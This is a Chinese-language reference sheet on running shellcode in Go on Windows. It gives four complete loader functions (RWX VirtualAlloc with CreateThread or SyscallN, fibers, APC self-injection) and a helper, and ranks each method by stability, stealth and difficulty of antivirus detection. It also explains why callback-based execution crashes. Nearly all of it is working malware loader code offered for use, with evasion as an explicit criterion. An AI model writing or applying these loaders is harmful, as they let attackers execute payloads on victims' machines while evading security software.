# Shellcode执行方式参考

## 重要说明

**冷门回调执行有严重兼容性问题！** Windows回调机制会传递参数到栈上，导致shellcode执行失败。

推荐使用以下稳定的执行方式：

---

## 稳定执行方式

### 方式1：syscall.SyscallN调用API + CreateThread执行（最稳定）

**重要：syscall.SyscallN不能直接调用shellcode地址，会崩溃！**

syscall.SyscallN用于调用API函数地址，shellcode执行必须通过CreateThread。

```go
func executeShellcodeSyscall(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")

    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

    // 分配RWX内存 (MEM_COMMIT|MEM_RESERVE=0x3000, PAGE_EXECUTE_READWRITE=0x40)
    addr, _, _ := syscall.SyscallN(VirtualAlloc.Addr(), 0, uintptr(len(sc)), 0x3000, 0x40)
    if addr == 0 {
        return
    }

    // 复制shellcode
    syscall.SyscallN(RtlMoveMemory.Addr(), addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

    // 【必须】CreateThread创建线程执行shellcode（不能用syscall.SyscallN(addr)）
    thread, _, _ := syscall.SyscallN(CreateThread.Addr(), 0, 0, addr, 0, 0, 0)
    syscall.SyscallN(WaitForSingleObject.Addr(), thread, 0xFFFFFFFF)
}
```

### 方式2：CreateThread创建线程执行（经典稳定）

```go
func executeShellcodeCreateThread(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")

    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

    // 分配RWX内存
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x40)
    if addr == 0 {
        return
    }

    // 复制shellcode
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

    // CreateThread创建新线程执行，参数干净
    thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
    WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}
```

### 方式3：Fiber执行

```go
func executeShellcodeFiber(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")

    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
    CreateFiber := kernel32.NewProc("CreateFiber")
    SwitchToFiber := kernel32.NewProc("SwitchToFiber")

    // 分配内存并复制shellcode
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x40)
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

    // Fiber执行
    ConvertThreadToFiber.Call(0)
    fiber, _, _ := CreateFiber.Call(0, addr, 0)
    SwitchToFiber.Call(fiber)
}
```

### 方式4：APC自注入

```go
func executeShellcodeAPC(sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")

    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    QueueUserAPC := kernel32.NewProc("QueueUserAPC")
    SleepEx := kernel32.NewProc("SleepEx")

    // 分配内存并复制shellcode
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x40)
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

    // APC注入到当前线程
    QueueUserAPC.Call(addr, uintptr(windows.GetCurrentThread()), 0)
    SleepEx.Call(0, 1) // Alertable = TRUE
}
```

---

## 为什么冷门回调执行不稳定

### 回调参数问题

Windows回调函数使用stdcall调用约定，系统会传递参数：

| 回调API | 回调签名 | 传递参数数 |
|---------|----------|------------|
| EnumChildWindows | `BOOL(HWND, LPARAM)` | 2 |
| EnumFontFamiliesW | `BOOL(LOGFONT*, TEXTMETRIC*, DWORD)` | 3 |
| EnumDesktopWindows | `BOOL(HWND, LPARAM)` | 2 |

当shellcode被作为回调调用时：
1. 系统将参数压栈（HWND, LPARAM等）
2. 调用shellcode地址
3. Shellcode期望干净的栈状态，遇到额外参数崩溃

### 正确理解

所谓"冷门回调执行"的本质是：
- 回调函数地址 = shellcode入口点
- 但shellcode不是设计为回调函数的
- 大多数shellcode不处理回调参数

**结论：直接将shellcode地址作为回调参数是不可靠的！**

---

## 推荐执行方式优先级

| 方式 | 稳定性 | 隐蔽性 | 杀软检测难度 | 推荐度 |
|------|--------|--------|--------------|--------|
| syscall.SyscallN直接调用 | 高 | 中 | 中 | ★★★★★ |
| VirtualAlloc + CreateThread | 高 | 中 | 高（常见检测） | ★★★★☆ |
| Fiber | 高 | 高 | 高 | ★★★★☆ |
| APC自注入 | 高 | 高 | 高 | ★★★★☆ |
| 冷门回调（不推荐） | 低 | 高 | 低 | ★☆☆☆☆ |

---

## 辅助函数

```go
// 分配RWX内存并复制shellcode
func allocRWXAndCopy(sc []byte) uintptr {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")

    // MEM_COMMIT|MEM_RESERVE=0x3000, PAGE_EXECUTE_READWRITE=0x40
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x3000, 0x40)
    if addr == 0 {
        return 0
    }

    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
    return addr
}
```

---

## 内存保护常量

| 常量 | 值 | 说明 |
|------|-----|------|
| MEM_COMMIT | 0x1000 | 提交内存 |
| MEM_RESERVE | 0x2000 | 保留内存 |
| PAGE_EXECUTE_READWRITE | 0x40 | 可执行可读写 |
| PAGE_EXECUTE_READ | 0x20 | 可执行只读 |
| PAGE_READWRITE | 0x04 | 可读写（需要后续改保护） |